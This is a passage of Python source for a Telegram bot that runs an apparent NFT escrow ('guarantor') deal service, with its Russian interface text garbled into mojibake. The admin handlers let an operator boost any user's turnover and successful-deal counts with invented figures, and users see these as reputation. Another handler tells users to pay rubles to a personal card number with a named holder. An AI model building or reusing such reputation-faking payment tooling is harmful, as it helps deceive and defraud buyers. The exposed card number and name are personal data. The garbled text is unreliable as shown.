        f"{hbold('‚úÖ –û–ø–ª–∞—Ç–∞ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∞!')}\n\n"
        f"–ü—Ä–æ–¥–∞–≤–µ—Ü —É–≤–µ–¥–æ–º–ª–µ–Ω. –û–∂–∏–¥–∞–π—Ç–µ –ø–µ—Ä–µ–¥–∞—á–∏ NFT –≥–∞—Ä–∞–Ω—Ç—É.",
        parse_mode="HTML"
    )
    await callback.answer()

@dp.message(F.text == "üì± –ü—Ä–æ—Ñ–∏–ª—å")
async def show_profile(message: types.Message):
    user_id = message.from_user.id
    user = db.get_user(user_id)
    user_deals = db.get_user_deals(user_id)
    
    active_deals = [d for d in user_deals if d['status'] in [DealStatus.PENDING.value, DealStatus.PAID.value, DealStatus.NFT_SENT.value]]
    completed_deals = [d for d in user_deals if d['status'] == DealStatus.COMPLETED.value]
    
    profile_text = (
        f"{hbold('üë§ –í–∞—à –ø—Ä–æ—Ñ–∏–ª—å')}\n\n"
        f"ID: {user_id}\n"
        f"–ò–º—è: {user['first_name']}\n"
        f"Username: @{user['username'] if user['username'] else '–æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç'}\n"
        f"–†–æ–ª—å: {'–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä' if user['role'] == 'admin' else '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å'}\n\n"
        f"{hbold('üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:')}\n"
        f"üí∞ –í—Å–µ–≥–æ —Å–¥–µ–ª–æ–∫: {len(user_deals)}\n"
        f"üîÑ –ê–∫—Ç–∏–≤–Ω—ã—Ö —Å–¥–µ–ª–æ–∫: {len(active_deals)}\n"
        f"‚úÖ –£—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫: {user['successful_deals']}\n"
        f"üìà –û–±–æ—Ä–æ—Ç: {user['total_turnover']} {SUPPORTED_CURRENCIES['TON']}\n\n"
    )
    
    if active_deals:
        profile_text += f"{hbold('üìã –ê–∫—Ç–∏–≤–Ω—ã–µ —Å–¥–µ–ª–∫–∏:')}\n"
        for deal in active_deals[:5]:
            status_emoji = {
                DealStatus.PENDING.value: "‚è≥",
                DealStatus.PAID.value: "üí∞",
                DealStatus.NFT_SENT.value: "üéÅ"
            }.get(deal['status'], "‚ùì")
            # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø—Ä–æ–¥–∞–≤—Ü–µ/–ø–æ–∫—É–ø–∞—Ç–µ–ª–µ –¥–ª—è –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞
            if deal['creator_id'] == user_id:
                role = "üì§ –ü—Ä–æ–¥–∞–≤–µ—Ü"
            else:
                role = "üì• –ü–æ–∫—É–ø–∞—Ç–µ–ª—å"
            profile_text += f"{status_emoji} #{deal['deal_id']} - {deal['amount']} {deal['currency']} ({role})\n"
    
    await message.answer(profile_text, parse_mode="HTML")

@dp.message(F.text == "‚ÑπÔ∏è –ü–æ–¥–¥–µ—Ä–∂–∫–∞")
async def show_support(message: types.Message):
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ –∏–Ω–ª–∞–π–Ω-–∫–Ω–æ–ø–∫—É —Å–æ —Å—Å—ã–ª–∫–æ–π –Ω–∞ –ø–æ–¥–¥–µ—Ä–∂–∫—É
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="üì® –ù–∞–ø–∏—Å–∞—Ç—å —Å–∞–ø–ø–æ—Ä—Ç—É", url=f"tg://resolve?domain={SUPPORT_USERNAME}")
    ]])
    await message.answer(
        f"üìû –°–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏",
        reply_markup=kb
    )

@dp.message(F.text == "üåê –ù–∞—à —Å–∞–π—Ç")
async def show_website(message: types.Message):
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ –∏–Ω–ª–∞–π–Ω-–∫–Ω–æ–ø–∫—É —Å–æ —Å—Å—ã–ª–∫–æ–π –Ω–∞ —Å–∞–π—Ç
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="üîó –ü–µ—Ä–µ–π—Ç–∏ –Ω–∞ —Å–∞–π—Ç", url=WEBSITE_URL)
    ]])
    await message.answer(
        f"üåê –ù–∞—à –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π —Å–∞–π—Ç",
        reply_markup=kb
    )

@dp.message(F.text == "üí≥ –†–µ–∫–≤–∏–∑–∏—Ç—ã")
async def show_payment_details(message: types.Message):
    payment_text = (
        f"{hbold('üí≥ –ü–ª–∞—Ç–µ–∂–Ω—ã–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã')}\n\n"
        f"–î–ª—è –æ–ø–ª–∞—Ç—ã —Å–¥–µ–ª–æ–∫ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Å–ª–µ–¥—É—é—â–∏–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã:\n\n"
        f"‚≠ê –ó–≤–µ–∑–¥—ã: —á–µ—Ä–µ–∑ –±–æ—Ç–∞\n"
        f"‚ÇΩ –†—É–±–ª–∏: 2204 1201 3279 4013 - Ma—Ä–∫–∏–Ω –Ø—Ä–æ—Å–ª–∞–≤\n"
    )
    await message.answer(payment_text, parse_mode="HTML")

# –ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å
@dp.message(F.text == "üëë –ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å")
async def admin_panel(message: types.Message):
    user_id = message.from_user.id
    user = db.get_user(user_id)
    
    if user['role'] != UserRole.ADMIN.value:
        await message.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ –∫ –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª–∏")
        return
    
    await message.answer(
        f"{hbold('üëë –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–Ω–µ–ª—å')}\n\n"
        f"–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:",
        reply_markup=get_admin_keyboard(),
        parse_mode="HTML"
    )

@dp.callback_query(lambda c: c.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    all_deals = db.get_all_deals()
    active_deals = db.get_active_deals()
    pending_deals = db.get_pending_deals()
    completed_deals = [d for d in all_deals if d['status'] == DealStatus.COMPLETED.value]
    
    total_turnover = sum(d['amount'] for d in completed_deals if d['currency'] == 'TON')
    total_users = len(db.users)
    
    stats_text = (
        f"{hbold('üìä –û–±—â–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞')}\n\n"
        f"üë• –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {total_users}\n"
        f"üì¶ –í—Å–µ–≥–æ —Å–¥–µ–ª–æ–∫: {len(all_deals)}\n"
        f"üîÑ –ê–∫—Ç–∏–≤–Ω—ã—Ö —Å–¥–µ–ª–æ–∫: {len(active_deals)}\n"
        f"‚è≥ –û–∂–∏–¥–∞—é—Ç –æ–ø–ª–∞—Ç—ã: {len(pending_deals)}\n"
        f"‚úÖ –ó–∞–≤–µ—Ä—à–µ–Ω–æ —Å–¥–µ–ª–æ–∫: {len(completed_deals)}\n"
        f"üí∞ –û–±—â–∏–π –æ–±–æ—Ä–æ—Ç (TON): {total_turnover}\n\n"
        f"–ü–æ –≤–∞–ª—é—Ç–∞–º:\n"
    )
    
    for currency in SUPPORTED_CURRENCIES:
        currency_deals = [d for d in completed_deals if d['currency'] == currency]
        currency_sum = sum(d['amount'] for d in currency_deals)
        stats_text += f"{SUPPORTED_CURRENCIES[currency]}: {currency_sum}\n"
    
    await callback.message.edit_text(stats_text, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_deals")
async def admin_deals_list(callback: types.CallbackQuery):
    active_deals = db.get_active_deals()
    
    if not active_deals:
        await callback.message.edit_text("‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–¥–µ–ª–æ–∫")
        await callback.answer()
        return
    
    text = f"{hbold('üìã –ê–∫—Ç–∏–≤–Ω—ã–µ —Å–¥–µ–ª–∫–∏:')}\n\n"
    builder = InlineKeyboardBuilder()
    
    for deal in active_deals[:10]:
        status_emoji = {
            DealStatus.PENDING.value: "‚è≥",
            DealStatus.PAID.value: "üí∞",
            DealStatus.NFT_SENT.value: "üéÅ"
        }.get(deal['status'], "‚ùì")
        
        text += f"{status_emoji} #{deal['deal_id']} - {deal['amount']} {deal['currency']}\n"
        builder.button(text=deal['deal_id'], callback_data=f"admin_deal_{deal['deal_id']}")
    
    builder.button(text="üîô –ù–∞–∑–∞–¥", callback_data="admin_back")
    builder.adjust(3)
    
    await callback.message.edit_text(text, reply_markup=builder.as_markup(), parse_mode="HTML")
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("admin_deal_"))
async def admin_deal_detail(callback: types.CallbackQuery):
    deal_id = callback.data.replace("admin_deal_", "")
    deal = db.get_deal(deal_id)
    
    if not deal:
        await callback.message.edit_text("‚ùå –°–¥–µ–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
        await callback.answer()
        return
    
    creator = db.get_user(deal['creator_id'])
    buyer = db.get_user(deal['buyer_id']) if deal['buyer_id'] else None
    
    deal_text = (
        f"{hbold(f'–°–¥–µ–ª–∫–∞ #{deal_id}')}\n\n"
        f"–°—Ç–∞—Ç—É—Å: {deal['status']}\n"
        f"üí± –í–∞–ª—é—Ç–∞: {SUPPORTED_CURRENCIES[deal['currency']]}\n"
        f"üí∞ –°—É–º–º–∞: {deal['amount']}\n"
        f"üìù –û–ø–∏—Å–∞–Ω–∏–µ: {deal['description']}\n\n"
        f"üë§ –ü—Ä–æ–¥–∞–≤–µ—Ü: {creator['first_name']} (@{creator['username']})\n"
    )
    
    if buyer:
        deal_text += f"üë§ –ü–æ–∫—É–ø–∞—Ç–µ–ª—å: {buyer['first_name']} (@{buyer['username']})\n"
    
    if deal['paid_at']:
        deal_text += f"üí∞ –û–ø–ª–∞—á–µ–Ω–æ: {deal['paid_at']}\n"
    
    await callback.message.edit_text(
        deal_text,
        reply_markup=get_deal_actions_keyboard(deal_id, UserRole.ADMIN.value),
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("admin_nft_"))
async def admin_nft_received(callback: types.CallbackQuery):
    deal_id = callback.data.replace("admin_nft_", "")
    deal = db.get_deal(deal_id)
    
    if not deal:
        await callback.answer("‚ùå –°–¥–µ–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
        return
    
    db.update_deal(deal_id, status=DealStatus.NFT_SENT.value)
    
    # –£–≤–µ–¥–æ–º–ª—è–µ–º –ø–æ–∫—É–ø–∞—Ç–µ–ª—è
    if deal['buyer_id']:
        try:
            await bot.send_message(
                deal['buyer_id'],
                f"{hbold('üéÅ NFT –ø–æ–ª—É—á–µ–Ω –≥–∞—Ä–∞–Ω—Ç–æ–º!')}\n\n"
                f"ID —Å–¥–µ–ª–∫–∏: {hcode('#' + deal_id)}\n"
                f"–ì–∞—Ä–∞–Ω—Ç –ø—Ä–æ–≤–µ—Ä—è–µ—Ç NFT. –û–∂–∏–¥–∞–π—Ç–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Å–¥–µ–ª–∫–∏.",
                parse_mode="HTML"
            )
        except:
            pass
    
    await callback.message.edit_text(
        f"‚úÖ –°—Ç–∞—Ç—É—Å —Å–¥–µ–ª–∫–∏ #{deal_id} –æ–±–Ω–æ–≤–ª–µ–Ω: NFT –ø–æ–ª—É—á–µ–Ω –≥–∞—Ä–∞–Ω—Ç–æ–º",
        reply_markup=get_admin_keyboard()
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("admin_complete_"))
async def admin_complete_deal(callback: types.CallbackQuery):
    deal_id = callback.data.replace("admin_complete_", "")
    deal = db.get_deal(deal_id)
    
    if not deal:
        await callback.answer("‚ùå –°–¥–µ–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
        return
    
    db.update_deal(deal_id, 
                   status=DealStatus.COMPLETED.value,
                   completed_at=datetime.now().isoformat())
    
    # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø—Ä–æ–¥–∞–≤—Ü–∞
    seller = db.get_user(deal['creator_id'])
    db.update_user(
        deal['creator_id'],
        successful_deals=seller['successful_deals'] + 1,
        total_turnover=seller['total_turnover'] + deal['amount']
    )
    
    # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø–æ–∫—É–ø–∞—Ç–µ–ª—è, –µ—Å–ª–∏ –µ—Å—Ç—å
    if deal['buyer_id']:
        buyer = db.get_user(deal['buyer_id'])
        db.update_user(
            deal['buyer_id'],
            successful_deals=buyer['successful_deals'] + 1
        )
    
    # –£–≤–µ–¥–æ–º–ª—è–µ–º —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤
    for user_id in [deal['creator_id'], deal['buyer_id']]:
        if user_id:
            try:
                await bot.send_message(
                    user_id,
                    f"{hbold('‚úÖ –°–¥–µ–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!')}\n\n"
                    f"ID —Å–¥–µ–ª–∫–∏: {hcode('#' + deal_id)}\n"
                    f"–°–ø–∞—Å–∏–±–æ –∑–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –Ω–∞—à–µ–≥–æ —Å–µ—Ä–≤–∏—Å–∞!",
                    parse_mode="HTML"
                )
            except:
                pass
    
    await callback.message.edit_text(
        f"‚úÖ –°–¥–µ–ª–∫–∞ #{deal_id} —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!",
        reply_markup=get_admin_keyboard()
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_add_turnover")
async def admin_add_turnover_start(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(AdminActions.adding_balance)
    await callback.message.edit_text(
        "–í–≤–µ–¥–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ —Å—É–º–º—É –æ–±–æ—Ä–æ—Ç–∞ –¥–ª—è –Ω–∞–∫—Ä—É—Ç–∫–∏ (–≤ —Ñ–æ—Ä–º–∞—Ç–µ: ID –°–£–ú–ú–ê):\n"
        "–ü—Ä–∏–º–µ—Ä: 123456789 1000"
    )
    await callback.answer()

@dp.message(AdminActions.adding_balance)
async def admin_add_turnover_process(message: types.Message, state: FSMContext):
    try:
        parts = message.text.split()
        if len(parts) != 2:
            raise ValueError
            
        user_id = int(parts[0])
        amount = float(parts[1])
        
        user = db.get_user(user_id)
        db.update_user(user_id, total_turnover=user['total_turnover'] + amount)
        
        await message.answer(f"‚úÖ –û–±–æ—Ä–æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id} —É–≤–µ–ª–∏—á–µ–Ω –Ω–∞ {amount}")
    except:
        await message.answer("‚ùå –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: ID –°–£–ú–ú–ê")
    
    await state.clear()

@dp.callback_query(lambda c: c.data == "admin_add_success")
async def admin_add_success_start(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(AdminActions.adding_successful_deals)
    await callback.message.edit_text(
        "–í–≤–µ–¥–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —É—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫ –¥–ª—è –Ω–∞–∫—Ä—É—Ç–∫–∏ (–≤ —Ñ–æ—Ä–º–∞—Ç–µ: ID –ö–û–õ–ò–ß–ï–°–¢–í–û):\n"
        "–ü—Ä–∏–º–µ—Ä: 123456789 5"
    )
    await callback.answer()

@dp.message(AdminActions.adding_successful_deals)
async def admin_add_success_process(message: types.Message, state: FSMContext):
    try:
        parts = message.text.split()
        if len(parts) != 2:
            raise ValueError
            
        user_id = int(parts[0])
        count = int(parts[1])
        
        user = db.get_user(user_id)
        db.update_user(user_id, successful_deals=user['successful_deals'] + count)
        
        await message.answer(f"‚úÖ –£—Å–ø–µ—à–Ω—ã–µ —Å–¥–µ–ª–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id} —É–≤–µ–ª–∏—á–µ–Ω—ã –Ω–∞ {count}")
    except:
        await message.answer("‚ùå –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: ID –ö–û–õ–ò–ß–ï–°–¢–í–û")
    
    await state.clear()

@dp.callback_query(lambda c: c.data == "admin_users")
async def admin_users_list(callback: types.CallbackQuery):
    users_text = f"{hbold('üë• –°–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:')}\n\n"
    
    for user_id, user_data in list(db.users.items())[:20]:
        users_text += f"ID: {user_id} | @{user_data['username']} | –°–¥–µ–ª–æ–∫: {user_data['successful_deals']} | –û–±–æ—Ä–æ—Ç: {user_data['total_turnover']}\n"
    
    await callback.message.edit_text(users_text, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_broadcast")
async def admin_broadcast_start(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(AdminActions.sending_broadcast)
    await callback.message.edit_text(
        "–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è —Ä–∞—Å—Å—ã–ª–∫–∏ –≤—Å–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º:"
    )
    await callback.answer()

@dp.message(AdminActions.sending_broadcast)
async def admin_broadcast_process(message: types.Message, state: FSMContext):
    broadcast_text = message.text
    sent_count = 0
    failed_count = 0
    
    for user_id in db.users.keys():
        try:
            await bot.send_message(
                user_id,
                f"{hbold('üì¢ –†–∞—Å—Å—ã–ª–∫–∞ –æ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–∏:')}\n\n{broadcast_text}",
                parse_mode="HTML"
            )
            sent_count += 1
            await asyncio.sleep(0.05)  # –ß—Ç–æ–±—ã –Ω–µ —Ñ–ª—É–¥–∏—Ç—å
        except:
            failed_count += 1
    
    await message.answer(
        f"‚úÖ –†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!\n"
        f"–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: {sent_count}\n"
        f"–ù–µ –¥–æ—Å—Ç–∞–≤–ª–µ–Ω–æ: {failed_count}"
    )
    await state.clear()

@dp.callback_query(lambda c: c.data == "admin_back")
async def admin_back(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"{hbold('üëë –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–Ω–µ–ª—å')}\n\n"
        f"–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:",
        reply_markup=get_admin_keyboard(),
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "cancel")
async def cancel_action(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text("‚ùå –î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ")
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("refresh_"))
async def refresh_deal(callback: types.CallbackQuery):
    deal_id = callback.data.replace("refresh_", "")
    deal = db.get_deal(deal_id)
    
    if not deal:
        await callback.answer("‚ùå –°–¥–µ–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
        return
    
    user = db.get_user(callback.from_user.id)
    await callback.message.edit_reply_markup(
        reply_markup=get_deal_actions_keyboard(deal_id, user['role'])
    )
    await callback.answer("üîÑ –î–∞–Ω–Ω—ã–µ –æ–±–Ω–æ–≤–ª–µ–Ω—ã")

@dp.callback_query(lambda c: c.data.startswith("cancel_"))
async def cancel_deal(callback: types.CallbackQuery):
    deal_id = callback.data.replace("cancel_", "")
    deal = db.get_deal(deal_id)
    
    if not deal:
        await callback.answer("‚ùå –°–¥–µ–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
        return
    
    if deal['creator_id'] != callback.from_user.id:
        user = db.get_user(callback.from_user.id)
        if user['role'] != UserRole.ADMIN.value:
            await callback.answer("‚ùå –í—ã –Ω–µ –º–æ–∂–µ—Ç–µ –æ—Ç–º–µ–Ω–∏—Ç—å —ç—Ç—É —Å–¥–µ–ª–∫—É")
            return
    
    db.update_deal(deal_id, status=DealStatus.CANCELLED.value)
    
    await callback.message.edit_text(
        f"‚ùå –°–¥–µ–ª–∫–∞ #{deal_id} –æ—Ç–º–µ–Ω–µ–Ω–∞",
        parse_mode="HTML"
    )
    await callback.answer()

@dp.message()
async def handle_unknown(message: types.Message):
    await message.answer(
        "‚ùå –Ø –Ω–µ –ø–æ–Ω–∏–º–∞—é —ç—Ç—É –∫–æ–º–∞–Ω–¥—É.\n"
        "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –º–µ–Ω—é –¥–ª—è –Ω–∞–≤–∏–≥–∞—Ü–∏–∏."
    )

async def main():
    print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
